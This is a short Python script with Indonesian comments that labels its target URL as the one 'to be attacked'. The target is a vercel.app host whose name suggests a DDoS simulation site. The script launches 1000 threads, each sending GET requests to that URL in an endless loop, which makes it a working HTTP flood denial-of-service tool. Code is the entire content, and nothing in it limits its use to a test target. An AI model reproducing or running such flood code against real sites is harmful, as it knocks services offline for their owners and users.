import requests
import threading

# URL yang akan diserang
url = "https://simulasi-ddos-4jd8.vercel.app/"

def send_request():
    while True:
        try:
            # Kirimkan permintaan GET ke URL
            response = requests.get(url)
            # Tampilkan status kode untuk debugging
            print(f"Status Code: {response.status_code}")
        except requests.RequestException as e:
            # Tampilkan pesan kesalahan jika permintaan gagal
            print(f"Request failed: {e}")

# Jumlah thread yang akan digunakan untuk mengirim permintaan
num_threads = 1000

# Buat dan jalankan thread
threads = []
for i in range(num_threads):
    thread = threading.Thread(target=send_request)
    thread.start()
    threads.append(thread)

# Tunggu semua thread selesai (tidak akan pernah selesai dalam kasus ini)
for thread in threads:
    thread.join()
